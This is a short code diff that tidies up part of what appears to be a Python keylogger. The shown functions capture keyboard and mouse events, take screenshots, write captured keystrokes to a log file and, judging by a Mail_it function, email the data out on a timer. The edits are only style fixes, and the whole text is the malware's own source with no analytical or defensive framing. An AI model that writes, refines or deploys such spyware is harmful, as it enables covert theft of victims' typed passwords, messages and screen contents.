@@ -70,9 +70,10 @@ def ScreenShot():
     def generate_name():
         return ''.join(random.choice(string.ascii_uppercase
                        + string.digits) for _ in range(7))
+
     name = str(generate_name())
     pics_names.append(name)
-    pyautogui.screenshot().save(name + '.png')
+    pyautogui.screenshot().save(f'{name}.png')
 
 
 def Mail_it(data, pics_names):
@@ -109,9 +110,8 @@ def OnMouseEvent(event):
         ScreenShot()
 
     if len(t) > 500:
-        f = open('Logfile.txt', 'a')
-        f.write(t)
-        f.close()
+        with open('Logfile.txt', 'a') as f:
+            f.write(t)
         t = ''
 
     if int(time.time() - start_time) == int(interval):
@@ -132,9 +132,8 @@ def OnKeyboardEvent(event):
     t = t + data
 
     if len(t) > 500:
-        f = open('Logfile.txt', 'a')
-        f.write(t)
-        f.close()
+        with open('Logfile.txt', 'a') as f:
+            f.write(t)
         t = ''
 
     if int(time.time() - start_time) == int(interval):
